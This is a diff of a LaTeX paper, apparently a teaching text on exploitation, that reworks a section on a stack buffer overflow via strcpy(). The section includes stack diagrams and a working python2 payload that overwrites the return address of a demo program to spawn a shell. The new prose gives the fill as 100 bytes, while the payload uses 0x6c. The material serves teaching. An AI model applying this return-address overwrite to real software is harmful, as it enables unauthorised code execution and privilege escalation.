@@ -229,37 +229,11 @@ on two principal fators:
 With cautious manipulations, an attacker could grant himself unrestricted
 priviledge to unpriviledged account or user.
 
-\textbf{\textit{Example:}} stack buffer overflow~\cite{one_stacksmashing_1996}. When invoking or exiting a standard C function,
+\textbf{\textit{Example:}} \textit{stack buffer overflow}~\cite{one_stacksmashing_1996}. When invoking or exiting a standard C function,
 the procedure prolog or epilog must be called, this involves saving the
 previous variables and allocating space for the new variables; and vice-versa
 when the function exits. The previous FP is pushed, a new FP is created and SP
 operates with respect to its new local variables.
-
-The instruction found at $@0x08048530$ gives the allocated size of the buffer
-100 bytes in hexadecimal. We also located exec\_shell at address $0x80484fb$. Here is the
-state of the stack at this point:To overwrite the return address with the one
-of exec\_shell we need to fill the buffer with $0x6c$ bytes, overwrite SFP with a
-fake value and then the target address. This is the state of the stack after
-our payload:
-
-\begin{lstlisting}
-| <argument>                 |
-| <return address>           |
-| <old %ebp>                 | <= %ebp
-| <0x6c bytes of             |
-|       ...                  |
-|       buffer>              |
-| <argument>                 |
-| <address of buffer>        | <= %esp
-           BEFORE
-
-| <0x80484fb <exec_shell>    |
-| 0x42424242 <fake old %ebp> | "BBBB" in hex
-| 0x41414141 ...             | "AAAA" in hex
-|   ... (0x6c bytes of 'A's) |
-|   ... 0x41414141           |
-           AFTER
-\end{lstlisting}
 
 \textbf{\textit{Procedure:}} in the following example(\ref{lst_overflow})
 the vulnerability comes from a wrong use of \textit{strcpy()}. The target
@@ -289,7 +263,32 @@ Dump of assembler code for function vuln_func:
 $1 = (...) 0x80484fb <exec_shell>
 \end{lstlisting}
 
-\begin{lstlisting}[float=ht]
+To overwrite the return address with the one
+of exec\_shell we need to fill the buffer with $100$ bytes, overwrite
+SFP\footnote{the saved frame pointer (old content of \%ebp) is called SFP} with a
+dummy value and then the target address.
+
+\begin{lstlisting}[aboveskip=\bigskipamount,belowskip=\medskipamount,caption=Stack before and after overflow]
+| <argument>                 |
+| <return address>           |
+| <old %ebp>                 | <= %ebp
+| <0x6c bytes of             |
+|       ...                  |
+|       buffer>              |
+| <argument>                 |
+| <address of buffer>        | <= %esp
+           BEFORE
+
+| 0x80484fb <exec_shell()>   |
+| 0x42424242 <fake old %ebp> | "BBBB" in hex
+| 0x41414141 ...             | "AAAA" in hex
+|   ... (0x6c bytes of 'A's) |
+|   ... 0x41414141           |
+           AFTER
+\end{lstlisting}
+
+
+\begin{lstlisting}[float]
 $ ./simple_overflow "$(python2 -c 'print "A"*0x6c + "BBBB" + "\xfb\x84\x04\x08"')"
 Spawning a shell !
 sh-4.4$
